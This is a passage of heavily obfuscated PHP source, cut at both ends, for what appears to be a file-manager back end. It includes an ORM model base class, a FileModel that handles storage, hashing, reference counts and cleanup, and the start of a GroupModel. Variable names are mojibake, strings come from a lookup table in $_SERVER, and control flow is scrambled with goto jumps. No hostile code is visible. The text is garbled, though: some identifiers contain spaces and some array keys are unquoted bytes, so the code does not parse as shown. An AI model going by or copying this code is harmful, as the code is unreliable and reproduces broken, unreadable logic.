$_SERVER[£ü]; if (empty($this->trueTableName)) { $bøÓá©›£ = !empty($this->tablePrefix) ? $this->tablePrefix : $eÓÈ¼½×ˆ[33]; if (!empty($this->tableName)) { $bøÓá©›£ .= $this->tableName; } else { $bøÓá©›£ .= think_parse_name($this->name); } $this->trueTableName = strtolower($bøÓá©›£); } return (!empty($this->dbName) ? $this->dbName . $eÓÈ¼½×ˆ[93] : $eÓÈ¼½×ˆ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $a â„®½çÜ =& $_SERVER[£ü]; return isset($this->fields[$a â„®½çÜ[236]]) ? $this->fields[$a â„®½çÜ[236]] : $this->pk; } public function getDbFields() { $A¢ÎóâÜ ‰ =& $_SERVER[£ü]; if (isset($this->options[$A¢ÎóâÜ ‰[264]])) { $e¤›ÒƒÏ…¢ = $this->db->getFields($this->options[$A¢ÎóâÜ ‰[264]]); return $e¤›ÒƒÏ…¢ ? array_keys($e¤›ÒƒÏ…¢) : !1; } if ($this->fields) { $e¤›ÒƒÏ…¢ = $this->fields; unset($e¤›ÒƒÏ…¢[$A¢ÎóâÜ ‰[235]], $e¤›ÒƒÏ…¢[$A¢ÎóâÜ ‰[236]], $e¤›ÒƒÏ…¢[$A¢ÎóâÜ ‰[237]], $e¤›ÒƒÏ…¢[$A¢ÎóâÜ ‰[234]]); return $e¤›ÒƒÏ…¢; } return !1; } public function data($eï•§™ËÎË = '') { $e¯Û†ğçÍÕ =& $_SERVER[£ü]; if ($e¯Û†ğçÍÕ[33] === $eï•§™ËÎË && !empty($this->data)) { return $this->data; } if (is_object($eï•§™ËÎË)) { $eï•§™ËÎË = get_object_vars($eï•§™ËÎË); } elseif (is_string($eï•§™ËÎË)) { parse_str($eï•§™ËÎË, $eï•§™ËÎË); } elseif (!is_array($eï•§™ËÎË)) { think_exception(think_lang($e¯Û†ğçÍÕ[256])); } $this->data = $eï•§™ËÎË; return $this; } public function join($fÚØôÑˆ²¿) { $d“ÁöóëĞ“ =& $_SERVER[£ü]; if (is_array($fÚØôÑˆ²¿)) { $this->options[$d“ÁöóëĞ“[267]] = $fÚØôÑˆ²¿; } elseif (!empty($fÚØôÑˆ²¿)) { $this->options[$d“ÁöóëĞ“[267]][] = $fÚØôÑˆ²¿; } return $this; } public function union($b®õ‡öÒºï, $DÄ£­ÍÉ«ß = false) { goto aàùšî²’ ; FÃÒˆ£‘ô‹: return $this; goto dŠÈå”í•£; Cæ¬Éº¿•±: if (is_object($b®õ‡öÒºï)) { $b®õ‡öÒºï = get_object_vars($b®õ‡öÒºï); } if (is_string($b®õ‡öÒºï)) { $bĞ¼ÓĞ»©ˆ = $b®õ‡öÒºï; } elseif (is_array($b®õ‡öÒºï)) { if (isset($b®õ‡öÒºï[0])) { $this->options[$d˜ßøøƒ£[332]] = array_merge($this->options[$d˜ßøøƒ£[332]], $b®õ‡öÒºï); return $this; } else { $bĞ¼ÓĞ»©ˆ = $b®õ‡öÒºï; } } else { think_exception(think_lang($d˜ßøøƒ£[256])); } $this->options[$d˜ßøøƒ£[332]][] = $bĞ¼ÓĞ»©ˆ; goto FÃÒˆ£‘ô‹; aàùšî²’ : $d˜ßøøƒ£ =& $_SERVER[£ü]; if (empty($b®õ‡öÒºï)) { return $this; } if ($DÄ£­ÍÉ«ß) { $this->options[$d˜ßøøƒ£[332]][$d˜ßøøƒ£[333]] = !0; } goto Cæ¬Éº¿•±; dŠÈå”í•£: } public function cache($BÉÊ÷“¡à  = true, $AÇ‡ãÖ³ = null, $BÌÑšÈœ†¹ = '') { $F±¾µŒÊŠ =& $_SERVER[£ü]; if (!1 !== $BÉÊ÷“¡à ) { $this->options[$F±¾µŒÊŠ[334]] = array($F±¾µŒÊŠ[89] => $BÉÊ÷“¡à , $F±¾µŒÊŠ[324] => $AÇ‡ãÖ³, $F±¾µŒÊŠ[29] => $BÌÑšÈœ†¹); } return $this; } public function field($F—¹«ôøß, $BôòİÅµ‚‰ = false) { $F¤ãˆÆù’‰ =& $_SERVER[£ü]; if (!0 === $F—¹«ôøß) { $BÁ±ÈÑ©… = $this->getDbFields(); $F—¹«ôøß = $BÁ±ÈÑ©… ? $BÁ±ÈÑ©… : $F¤ãˆÆù’‰[173]; } elseif ($BôòİÅµ‚‰) { if (is_string($F—¹«ôøß)) { $F—¹«ôøß = explode($F¤ãˆÆù’‰[47], $F—¹«ôøß); } $BÁ±ÈÑ©… = $this->getDbFields(); $F—¹«ôøß = $BÁ±ÈÑ©… ? array_diff($BÁ±ÈÑ©…, $F—¹«ôøß) : $F—¹«ôøß; } $this->options[$F¤ãˆÆù’‰[258]] = $F—¹«ôøß; return $this; } public function scope($E±ÎÍ¢¡Şğ = '', $B’¥çÁ¾ô¹ = NULL) { $Cİõµ¸µ“Ù =& $_SERVER[£ü]; if ($Cİõµ¸µ“Ù[33] === $E±ÎÍ¢¡Şğ) { if (isset($this->_scope[$Cİõµ¸µ“Ù[34]])) { $A„°Ù¯Î¾ = $this->_scope[$Cİõµ¸µ“Ù[34]]; } else { return $this; } } elseif (is_string($E±ÎÍ¢¡Şğ)) { $bÛÍ³¶Î“Å = explode($Cİõµ¸µ“Ù[47], $E±ÎÍ¢¡Şğ); $A„°Ù¯Î¾ = array(); foreach ($bÛÍ³¶Î“Å as $aêÂ‹¹‚›) { if (!isset($this->_scope[$aêÂ‹¹‚›])) { continue; } $A„°Ù¯Î¾ = array_merge($A„°Ù¯Î¾, $this->_scope[$aêÂ‹¹‚›]); } if (!empty($B’¥çÁ¾ô¹) && is_array($B’¥çÁ¾ô¹)) { $A„°Ù¯Î¾ = array_merge($A„°Ù¯Î¾, $B’¥çÁ¾ô¹); } } elseif (is_array($E±ÎÍ¢¡Şğ)) { $A„°Ù¯Î¾ = $E±ÎÍ¢¡Şğ; } if (is_array($A„°Ù¯Î¾) && !empty($A„°Ù¯Î¾)) { $this->options = array_merge($this->options, array_change_key_case($A„°Ù¯Î¾)); } return $this; } public function where($f‡£«ÅŞÅ, $AŸÛ“âˆØµ = null) { $a¤‘‰Šãß =& $_SERVER[£ü]; if (!is_null($AŸÛ“âˆØµ) && is_string($f‡£«ÅŞÅ)) { if (!is_array($AŸÛ“âˆØµ)) { $AŸÛ“âˆØµ = func_get_args(); array_shift($AŸÛ“âˆØµ); } $AŸÛ“âˆØµ = array_map(array($this->db, $a¤‘‰Šãß[328]), $AŸÛ“âˆØµ); $f‡£«ÅŞÅ = vsprintf($f‡£«ÅŞÅ, $AŸÛ“âˆØµ); } elseif (is_object($f‡£«ÅŞÅ)) { $f‡£«ÅŞÅ = get_object_vars($f‡£«ÅŞÅ); } elseif (is_array($f‡£«ÅŞÅ)) { foreach ($f‡£«ÅŞÅ as $a©©Ò¿²ã” => $DÜÇÓ›Áé¯) { if ((is_numeric($a©©Ò¿²ã”) || !$a©©Ò¿²ã”) && is_string($DÜÇÓ›Áé¯)) { think_trace($a¤‘‰Šãß[335], $a¤‘‰Šãß[33], $a¤‘‰Šãß[46]); die; } } } if (is_string($f‡£«ÅŞÅ) && $a¤‘‰Šãß[33] != $f‡£«ÅŞÅ) { $A¨Ü¡…’˜‡ = array(); $A¨Ü¡…’˜‡[$a¤‘‰Šãß[336]] = $f‡£«ÅŞÅ; $f‡£«ÅŞÅ = $A¨Ü¡…’˜‡; } if (isset($this->options[$a¤‘‰Šãß[260]])) { $this->options[$a¤‘‰Šãß[260]] = array_merge($this->options[$a¤‘‰Šãß[260]], $f‡£«ÅŞÅ); } else { $this->options[$a¤‘‰Šãß[260]] = $f‡£«ÅŞÅ; } return $this; } public function limit($c¦ì²–à«ê, $a—ñÔÜ ùØ = null) { $d‘Ø…ºíÒ =& $_SERVER[£ü]; $this->options[$d‘Ø…ºíÒ[277]] = is_null($a—ñÔÜ ùØ) ? $c¦ì²–à«ê : $c¦ì²–à«ê . $d‘Ø…ºíÒ[47] . $a—ñÔÜ ùØ; return $this; } public function page($C‘‹‚¥šœ½, $b´§¬ƒÊ…Ü = null) { $A¶ó¶µ‡ =& $_SERVER[£ü]; $this->options[$A¶ó¶µ‡[337]] = is_null($b´§¬ƒÊ…Ü) ? $C‘‹‚¥šœ½ : $C‘‹‚¥šœ½ . $A¶ó¶µ‡[47] . $b´§¬ƒÊ…Ü; return $this; } public function comment($aòµ°‰²ã) { $this->options[$_SERVER[£ü][338]] = $aòµ°‰²ã; return $this; } public function setProperty($c¶åñÊš£¶, $bÀ­Âæ®Å§) { if (property_exists($this, $c¶åñÊš£¶)) { $this->{$c¶åñÊš£¶} = $bÀ­Âæ®Å§; } return $this; } } goto cÌ¬‹É‰Ô; f¹ŸùŞù‚À: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\145" => "\151\x6f\137\146\x69\x6c\145\x5f\x6d\x65\164\x61", "\155\145\x74\141\x46\151\x65\154\x64" => "\146\151\154\x65\111\x44"); public function fileInfo($B”¡™á„áĞ) { $EñŞ”Äç˜ë =& $_SERVER[£ü]; static $e¤™æçñõ£ = array(); if (!isset($e¤™æçñõ£[$B”¡™á„áĞ])) { $c’Õ´õŒ† = $EñŞ”Äç˜ë[2106]; $eå‘Ô±¶Ÿö = Model($EñŞ”Äç˜ë[418])->field($c’Õ´õŒ†)->where(array($EñŞ”Äç˜ë[416] => $B”¡™á„áĞ))->find(); $e¤™æçñõ£[$B”¡™á„áĞ] = $eå‘Ô±¶Ÿö; } return $e¤™æçñõ£[$B”¡™á„áĞ]; } public function addFileByContent($DÆÛ‚ÒŸ¯É = '', $c³Ï±£á¿ = '') { goto a‡‚Ãƒ‡…; Aå‰ÅøÏ……: $dàØ’êÉ– = $dÒÎÈ®Ù‚÷ . $FÚ®ğë¤‚[2108] . rand_string(16); file_put_contents($dàØ’êÉ–, $DÆÛ‚ÒŸ¯É); $BŠ„ÄŠŒ× = $this->addFile($dàØ’êÉ–, $c³Ï±£á¿, !0); goto déµí–©ç; a‡‚Ãƒ‡…: $FÚ®ğë¤‚ =& $_SERVER[£ü]; $dÒÎÈ®Ù‚÷ = TEMP_PATH . $FÚ®ğë¤‚[2107]; if (!is_dir($dÒÎÈ®Ù‚÷)) { mk_dir($dÒÎÈ®Ù‚÷); } goto Aå‰ÅøÏ……; déµí–©ç: if (file_exists($dàØ’êÉ–)) { @unlink($dàØ’êÉ–); } return $BŠ„ÄŠŒ×; goto c¯­ŠçôÜ; c¯­ŠçôÜ: } public function createFileName($C‰Ã¬êÆÁå) { goto BŠƒêÓ‰ß«; F´¼Şëù†â: if (!$bÌ±¢îÏ¤¥ && !Cache::get($a¤Ø”í÷’ø)) { $bÌ±¢îÏ¤¥ = !0; $Bàˆ¶èë¼¿ = IO::mkdir($Fß³•§‰…); if (!IO::exist($Bàˆ¶èë¼¿ . $AÃï£ôŒ[2110])) { IO::mkfile($Bàˆ¶èë¼¿ . $AÃï£ôŒ[2110]); } Cache::set($a¤Ø”í÷’ø, 1, 3600 * 2); } return $då÷Ç‡’±¯; goto F›ÇÚ”¬šª; BŠƒêÓ‰ß«: $AÃï£ôŒ =& $_SERVER[£ü]; $eèîïÁˆ = IO::init($AÃï£ôŒ[8]); $då÷Ç‡’±¯ = $this->makeFilePath($C‰Ã¬êÆÁå, $eèîïÁˆ); goto C£”‚ÚÁ´ì; C£”‚ÚÁ´ì: $Fß³•§‰… = $eèîïÁˆ->pathFather($då÷Ç‡’±¯); static $bÌ±¢îÏ¤¥ = false; $a¤Ø”í÷’ø = $AÃï£ôŒ[2109] . md5($Fß³•§‰…); goto F´¼Şëù†â; F›ÇÚ”¬šª: } public function makeFilePath($D£ùĞ™‘ÌÇ, $fØÁ­ÎÑ) { goto CÇ£öä¦Ì£; D¾íÚ¢–à: $E§ ßÍÔ•µ = $a‚£ÛœÕËÕ . rand_string(5) . short_id(100); $D£ùĞ™‘ÌÇ = str_replace($b†¦¹¿•İ[8], $b†¦¹¿•İ[70], KodIO::clear($D£ùĞ™‘ÌÇ)); if (!$D£ùĞ™‘ÌÇ) { $f¿Ø˜§‘‡Ê = $b†¦¹¿•İ[2113]; } goto BËĞÄ‰Õ†Ç; CÇ£öä¦Ì£: $b†¦¹¿•İ =& $_SERVER[£ü]; $f¿Ø˜§‘‡Ê = Model($b†¦¹¿•İ[1078])->get($b†¦¹¿•İ[2111]); $a‚£ÛœÕËÕ = KodIO::defaultIO() . date($b†¦¹¿•İ[2112]); goto D¾íÚ¢–à; BËĞÄ‰Õ†Ç: switch ($f¿Ø˜§‘‡Ê) { case $b†¦¹¿•İ[2114]: $E§ ßÍÔ•µ = $E§ ßÍÔ•µ . $b†¦¹¿•İ[93] . $fØÁ­ÎÑ->ext($D£ùĞ™‘ÌÇ); if ($fØÁ­ÎÑ->ext($D£ùĞ™‘ÌÇ) == $b†¦¹¿•İ[2054]) { $E§ ßÍÔ•µ .= $b†¦¹¿•İ[2115]; } break; case $b†¦¹¿•İ[2116]: goto eòÜöÂ¤; b­ÔËó»©§: break; goto cĞÀŞ³Ù…•; D«ôíô×·: if ($fØÁ­ÎÑ->ext($D£ùĞ™‘ÌÇ) == $b†¦¹¿•İ[2054]) { $D£ùĞ™‘ÌÇ .= $b†¦¹¿•İ[2115]; } $C©êæ¯¾Ñ = IO::fileNameAuto($a‚£ÛœÕËÕ, $D£ùĞ™‘ÌÇ); $E§ ßÍÔ•µ = $a‚£ÛœÕËÕ . $C©êæ¯¾Ñ; goto b­ÔËó»©§; eòÜöÂ¤: $D¼¿òÀæÛ© = Model($b†¦¹¿•İ[1078])->get($b†¦¹¿•İ[1302]); $AÅ‘£ˆß• = substr(md5($b†¦¹¿•İ[1874] . $D¼¿òÀæÛ© . date($b†¦¹¿•İ[676])), 0, 8); $a‚£ÛœÕËÕ = KodIO::defaultIO() . date($b†¦¹¿•İ[2117]) . $AÅ‘£ˆß• . $b†¦¹¿•İ[8]; goto D«ôíô×·; cĞÀŞ³Ù…•: case $b†¦¹¿•İ[2113]: break; default: break; } return $E§ ßÍÔ•µ; goto BÜĞ½èÇŠÚ; BÜĞ½èÇŠÚ: } public function addFileByRemote($Fè§óÈÖÉ£, $D¥ò³ßÎÒ², $BâŠÅÙ”Ì = array()) { goto fî²ñÔÜÎ¬; fî²ñÔÜÎ¬: $aµ‹è„Í÷ =& $_SERVER[£ü]; if (!IO::exist($Fè§óÈÖÉ£)) { return !1; } $fßÄ™ƒÔëš = $BâŠÅÙ”Ì[$aµ‹è„Í÷[160]] ? $BâŠÅÙ”Ì[$aµ‹è„Í÷[160]] : $aµ‹è„Í÷[33]; goto b‰¥É—Ğ ; b‰¥É—Ğ : $FÓä¦çìÍŞ = IO::hashMd5($Fè§óÈÖÉ£, $fßÄ™ƒÔëš); $CÆ«ŒÅİˆ  = KodIO::defaultDriver(); $D›ÜÃŸ„ = array($aµ‹è„Í÷[516] => IO::size($Fè§óÈÖÉ£), $aµ‹è„Í÷[2118] => 1, $aµ‹è„Í÷[383] => $D¥ò³ßÎÒ², $aµ‹è„Í÷[731] => $CÆ«ŒÅİˆ [$aµ‹è„Í÷[364]], $aµ‹è„Í÷[384] => $Fè§óÈÖÉ£, $aµ‹è„Í÷[2119] => $BâŠÅÙ”Ì[$aµ‹è„Í÷[161]] ? $BâŠÅÙ”Ì[$aµ‹è„Í÷[161]] : IO::hashSimple($Fè§óÈÖÉ£), $aµ‹è„Í÷[2120] => $FÓä¦çìÍŞ ? $FÓä¦çìÍŞ : $fßÄ™ƒÔëš); goto D©Œ¼ïÊä‹; D©Œ¼ïÊä‹: if ($cŒ–™ñ‚…Æ = $this->addFileCheckExist($D›ÜÃŸ„[$aµ‹è„Í÷[161]], $D›ÜÃŸ„[$aµ‹è„Í÷[160]], $D›ÜÃŸ„[$aµ‹è„Í÷[77]])) { return $cŒ–™ñ‚…Æ; } return $this->addFileData($D›ÜÃŸ„); goto f¢œİ‚ª„; f¢œİ‚ª„: } private function addFileData($e‚à©õÄ·) { $D ©šŠœ¬ =& $_SERVER[£ü]; if (!$e‚à©õÄ·) { return !1; } $e‚à©õÄ·[$D ©šŠœ¬[77]] = intval($e‚à©õÄ·[$D ©šŠœ¬[77]]); if (!$e‚à©õÄ·[$D ©šŠœ¬[77]] && strlen($e‚à©õÄ·[$D ©šŠœ¬[161]]) > 32) { $e‚à©õÄ·[$D ©šŠœ¬[77]] = intval(substr($e‚à©õÄ·[$D ©šŠœ¬[161]], 32)); } $f•Áë»¹öñ = $this->add($e‚à©õÄ·); return $this->find($f•Áë»¹öñ); } public function addFile($dõçƒˆ¾’Ğ, $E¥‘Ğœ›, $Cø×éî÷‚ó = false) { $DŞ­îƒ‘à = IO::hashSimple($dõçƒˆ¾’Ğ); $CÀ«ÃÈøÓø = IO::hashMd5($dõçƒˆ¾’Ğ); $BñË›Õ‰²˜ = IO::size($dõçƒˆ¾’Ğ); if ($F¨×Äéõ¯© = $this->addFileCheckExist($DŞ­îƒ‘à, $CÀ«ÃÈøÓø, $BñË›Õ‰²˜)) { return $F¨×Äéõ¯©; } $Bå¤É««¢‚ = $this->addFileMake($dõçƒˆ¾’Ğ, $BñË›Õ‰²˜, $DŞ­îƒ‘à, $CÀ«ÃÈøÓø, $E¥‘Ğœ›, $Cø×éî÷‚ó); return $this->addFileData($Bå¤É««¢‚); } public function addFileMake($EÖ­Ûæ½¬‰, $C³§…¦›˜¶, $AöÁê¡ãª, $EÕ÷‹Ó„¯‡, $aª°¯Êõá‘, $fšØÏÛÉÀá) { goto a…æØ¨É±ª; dµ“§¼˜Ú‚: $CÁìÀ¸àƒ = get_path_this($d¢Ğš‰ÏØ); if ($fšØÏÛÉÀá) { $E¿¹—‡’›« = IO::move($EÖ­Ûæ½¬‰, $E…³Á¨ó«Ô, !1, $CÁìÀ¸àƒ); } else { $E¿¹—‡’›« = IO::copy($EÖ­Ûæ½¬‰, $E…³Á¨ó«Ô, !1, $CÁìÀ¸àƒ); } if (!$E¿¹—‡’›«) { return !1; } goto aËãŞó×’; aËãŞó×’: $Có×àìì«í = KodIO::defaultDriver(); $c§‚ïäİœ = array($cîÂ¡†ÅÎ[516] => $C³§…¦›˜¶, $cîÂ¡†ÅÎ[2118] => 1, $cîÂ¡†ÅÎ[383] => $aª°¯Êõá‘, $cîÂ¡†ÅÎ[731] => $Có×àìì«í[$cîÂ¡†ÅÎ[364]], $cîÂ¡†ÅÎ[384] => $d¢Ğš‰ÏØ, $cîÂ¡†ÅÎ[2119] => $AöÁê¡ãª, $cîÂ¡†ÅÎ[2120] => $EÕ÷‹Ó„¯‡); return $c§‚ïäİœ; goto c†ƒ‡«ºØò; a…æØ¨É±ª: $cîÂ¡†ÅÎ =& $_SERVER[£ü]; $d¢Ğš‰ÏØ = $this->createFileName($aª°¯Êõá‘); $E…³Á¨ó«Ô = get_path_father($d¢Ğš‰ÏØ); goto dµ“§¼˜Ú‚; c†ƒ‡«ºØò: } public function addFileCheckExist($Fô½ÃŞµ‘, $dÀ±‰·Şïœ, $Bí£¤óÇ¾) { $f‡ÌËŒ§œ… =& $_SERVER[£ü]; $F À’Å˜…¦ = $this->findByHash($Fô½ÃŞµ‘, $dÀ±‰·Şïœ); if (!$F À’Å˜…¦) { return !1; } $c»š©„ÌÌ = array($f‡ÌËŒ§œ…[2118] => intval($F À’Å˜…¦[$f‡ÌËŒ§œ…[2121]]) + 1, $f‡ÌËŒ§œ…[516] => $Bí£¤óÇ¾); $this->where(array($f‡ÌËŒ§œ…[416] => $F À’Å˜…¦[$f‡ÌËŒ§œ…[415]]))->save($c»š©„ÌÌ); return $F À’Å˜…¦; } public function remove($f‚•‘©Ö£) { $this->linkCountChange($f‚•‘©Ö£, !1); $this->clearEmpty(); return !0; } public function linkAdd($f³¥ªôõ) { $this->linkCountChange($f³¥ªôõ, !0); } public function linkCountChange($e’ŞñÇ¿æ, $f‚¦‡‚‹Ñ) { goto C»£Ş‘»é”; EÓˆÜ’ßœ: $cÑâá¹µù¤ = array(); foreach ($e’ŞñÇ¿æ as $DŠõøÒ¸…) { $Eàù¥£æôš = $DŠõøÒ¸… . $ašŠÎÒ³Ü—[33]; if (!$cÑâá¹µù¤[$Eàù¥£æôš]) { $cÑâá¹µù¤[$Eàù¥£æôš] = 0; } $cÑâá¹µù¤[$Eàù¥£æôš]++; } $f±©À¿À† = array(); goto AÉá¹á††•; C»£Ş‘»é”: $ašŠÎÒ³Ü— =& $_SERVER[£ü]; if (!$e’ŞñÇ¿æ) { return; } if (!is_array($e’ŞñÇ¿æ)) { $e’ŞñÇ¿æ = array($e’ŞñÇ¿æ); } goto EÓˆÜ’ßœ; AÉá¹á††•: foreach ($cÑâá¹µù¤ as $DŠõøÒ¸… => $d‹Í¯¬¡¸©) { $Eàù¥£æôš = $d‹Í¯¬¡¸© . $ašŠÎÒ³Ü—[33]; if (!$f±©À¿À†[$Eàù¥£æôš]) { $f±©À¿À†[$Eàù¥£æôš] = array(); } $f±©À¿À†[$Eàù¥£æôš][] = $DŠõøÒ¸…; } foreach ($f±©À¿À† as $d‹Í¯¬¡¸© => $A´ğÅ“ù…†) { if (!$A´ğÅ“ù…†) { continue; } $d‹Í¯¬¡¸© = $f‚¦‡‚‹Ñ ? $d‹Í¯¬¡¸© : -intval($d‹Í¯¬¡¸©); $dŠ‰‰âæÑ = array($ašŠÎÒ³Ü—[415] => array($ašŠÎÒ³Ü—[7], $A´ğÅ“ù…†)); if ($d‹Í¯¬¡¸© < 0) { $dŠ‰‰âæÑ[$ašŠÎÒ³Ü—[2121]] = array($ašŠÎÒ³Ü—[919], abs($d‹Í¯¬¡¸©)); } $this->where($dŠ‰‰âæÑ)->setAdd($ašŠÎÒ³Ü—[2121], $d‹Í¯¬¡¸©); } goto E†ÀÉäºÀÄ; E†ÀÉäºÀÄ: } public function findByHash($cå¥×»Á³ˆ, $C´õÇÖ¶Ìµ = false) { $dï‚àœÛ¾Á =& $_SERVER[£ü]; if (!$cå¥×»Á³ˆ && !$C´õÇÖ¶Ìµ) { return !1; } $cÑÆ„‡±ğ• = array($dï‚àœÛ¾Á[2119] => $cå¥×»Á³ˆ); if ($C´õÇÖ¶Ìµ) { $cÑÆ„‡±ğ• = array($dï‚àœÛ¾Á[2120] => $C´õÇÖ¶Ìµ); } return $this->order($dï‚àœÛ¾Á[2122])->where($cÑÆ„‡±ğ•)->find(); } public function clearEmpty($C¶’ƒ×¡Ää = 0) { goto EôË®ïÓ›“; EôË®ïÓ›“: $c­é‚çÈÙÕ =& $_SERVER[£ü]; $b–ğÀË¢Çå = time() - 3600 * 24 * $C¶’ƒ×¡Ää; $däŠ„õ¨Ëë = $c­é‚çÈÙÕ[2123] . $b–ğÀË¢Çå; goto f›Õ´ƒå‰Ì; aœ»èŞ°âÜ: foreach ($A£ÛºñßÚ™ as $d»ÀßÕÇå¥) { $Cö²äºŞ¹->update(1); $this->resetFile($d»ÀßÕÇå¥); } $Cö²äºŞ¹->end(); goto C–Ø¥‹§Î; f›Õ´ƒå‰Ì: $A£ÛºñßÚ™ = $this->where($däŠ„õ¨Ëë)->select(); if (!$A£ÛºñßÚ™) { return; } $Cö²äºŞ¹ = new Task($c­é‚çÈÙÕ[2124], $c­é‚çÈÙÕ[33], count($A£ÛºñßÚ™)); goto aœ»èŞ°âÜ; C–Ø¥‹§Î: } private function resetFile($fªœ¤…Ï´‚) { goto dÂƒ¿ÍöÂ; D†É˜±: $EÌ£—­ù´í = Model($Eƒ¡èÈ×™¸[2125])->where($e¶ä³ê±ó)->count(); $D†‡‰îÒÏª = intval($AŒì¤™³¿¢) + intval($EÌ£—­ù´í); if ($D†‡‰îÒÏª == 0) { IO::remove($fªœ¤…Ï´‚[$Eƒ¡èÈ×™¸[75]]); $this->where($e¶ä³ê±ó)->delete(); $this->metaSet($fªœ¤…Ï´‚[$Eƒ¡èÈ×™¸[415]], null, null); return; } goto FŸ†®š±¨ƒ; FŸ†®š±¨ƒ: if ($fªœ¤…Ï´‚[$Eƒ¡èÈ×™¸[2121]] != $D†‡‰îÒÏª) { $this->where($e¶ä³ê±ó)->save(array($Eƒ¡èÈ×™¸[2118] => $D†‡‰îÒÏª)); } goto AñÀ¶¨Ìœã; dÂƒ¿ÍöÂ: $Eƒ¡èÈ×™¸ =& $_SERVER[£ü]; $e¶ä³ê±ó = array($Eƒ¡èÈ×™¸[416] => $fªœ¤…Ï´‚[$Eƒ¡èÈ×™¸[415]]); $AŒì¤™³¿¢ = Model($Eƒ¡èÈ×™¸[1100])->where($e¶ä³ê±ó)->count(); goto D†É˜±; AñÀ¶¨Ìœã: } public function storageInfo($e»¿Œ‹ğ ù = false) { goto Aİ©Ô©…Å; f¹…öÙ±Ö : $dÓˆø¾°Ó† = 1; $D’‹ŠŒòÄ = 0; $FÌì‰êÉ«« = 5000; goto Cî¥‡ƒÖ¨¥; Aİ©Ô©…Å: $Böº„®¥º =& $_SERVER[£ü]; $AŒßµ³Ğ¼é = $this->count() + 0.0; $A„èä°íâ’ = 0; goto f¹…öÙ±Ö ; Cî¥‡ƒÖ¨¥: for ($f‘æË­Ëï½ = 0; $f‘æË­Ëï½ < $AŒßµ³Ğ¼é; $f‘æË­Ëï½ = $f‘æË­Ëï½ + $FÌì‰êÉ««) { $CÉÄÛ¬Ş•í = $this->limit($f‘æË­Ëï½, $f‘æË­Ëï½ + $FÌì‰êÉ««)->select(); foreach ($CÉÄÛ¬Ş•í as $b®îöœ¼í) { $dÓˆø¾°Ó† += $b®îöœ¼í[$Böº„®¥º[77]] * $b®îöœ¼í[$Böº„®¥º[2121]]; $A„èä°íâ’ += $b®îöœ¼í[$Böº„®¥º[77]] * ($b®îöœ¼í[$Böº„®¥º[2121]] - 1); $D’‹ŠŒòÄ += $b®îöœ¼í[$Böº„®¥º[2121]]; } } $c™Éö¬Ïç® = array($Böº„®¥º[2126] => $dÓˆø¾°Ó†, $Böº„®¥º[2127] => $A„èä°íâ’, $Böº„®¥º[2128] => $A„èä°íâ’ / $dÓˆø¾°Ó†, $Böº„®¥º[81] => $AŒßµ³Ğ¼é, $Böº„®¥º[2129] => $D’‹ŠŒòÄ); return $c™Éö¬Ïç®; goto b®”¬…ÔŠ²; b®”¬…ÔŠ²: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\155\x65" => "\x67\162\x6f\165\x70\x5f\x6d\145\164\141", "\x6d\145\164\141\106\x69\145\x6c\x64" => "\147\162\x6f\x75\160\111\104"); protected function cacheFunctionAlias($BØèÔİ†ïÕ) { $D…ØôˆŠ° =& $_SERVER[£ü]; return array($D…ØôˆŠ°[2130] => array($BØèÔİ†ïÕ[0], $D…ØôˆŠ°[2131]), $D…ØôˆŠ°[2132] => array($BØèÔİ†ïÕ[0], $D…ØôˆŠ°[2131])); } protected function getInfo($EÃ‘¶¨­‘) { $eç‚›Ò™½Ë = $this->getInfoSimple($EÃ‘¶¨­‘); if (!$eç‚›Ò™½Ë) { return !1; } return $this->_listDataApplyItem($eç‚›Ò™½Ë); } protected function getInfoSimple($EÎÈ³äÃ†, $Aºƒ‚ñ’å = false) { $EìÒÃä‘ÉĞ =& $_SERVER[£ü]; if ($Aºƒ‚ñ’å) { $cŸ×®®‡½ = array($EìÒÃä‘ÉĞ[2064] => intval($EÎÈ³äÃ†)); $B…îãŒ¦ = $this->where($cŸ×®®‡½)->find(); return is_array($B…îãŒ¦) ? $B…îãŒ¦ : array(); } return $this->cacheFunctionGet($EìÒÃä‘ÉĞ[2133], $EÎÈ³äÃ†); } protected function groupAdd($cÚÍ¿íÒ·²) { goto BÀœ‰­‡—; aòº¥ÕŞ„: $EŠßàëÊñ« = $this->add($E†ˆßÅã¯¬); $this->setNamePinyin($EŠßàëÊñ«, $E†ˆßÅã¯¬[$Dì¸š½µ‚[28]]); Model($Dì¸š½µ‚[1100])->groupRootAdd($EŠßàëÊñ«); goto aøµ‰ã‘ŸÃ; aøµ‰ã‘ŸÃ: return $EŠßàëÊñ«; goto bĞ¥ñá·ï‡; BÀœ‰­‡—: $Dì¸š½µ‚ =& $_SERVER[£ü]; if (!$cÚÍ¿íÒ·²[$Dì¸š½µ‚[457]] && isset($cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]]) && $cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]] == 1) { if ($e“™ìèÊÃë = $this->getInfoSimple($cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]], !0)) { return $cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]]; } } else { $e“™ìèÊÃë = $this->getInfoSimple($cÚÍ¿íÒ·²[$Dì¸š½µ‚[457]]); if (!$e“™ìèÊÃë) { return !1; } } $føïÍêÖøì = $Dì¸š½µ‚[466]; goto cÈ›èµê›ó; cÈ›èµê›ó: if ($e“™ìèÊÃë[$Dì¸š½µ‚[455]]) { $føïÍêÖøì = $e“™ìèÊÃë[$Dì¸š½µ‚[455]] . $e“™ìèÊÃë[$Dì¸š½µ‚[2064]] . $Dì¸š½µ‚[47]; } $E†ˆßÅã¯¬ = array($Dì¸š½µ‚[383] => $this->groupNameAuto($cÚÍ¿íÒ·²[$Dì¸š½µ‚[457]], $cÚÍ¿íÒ·²[$Dì¸š½µ‚[28]]), $Dì¸š½µ‚[365] => $cÚÍ¿íÒ·²[$Dì¸š½µ‚[457]], $Dì¸š½µ‚[521] => $føïÍêÖøì, $Dì¸š½µ‚[2134] => 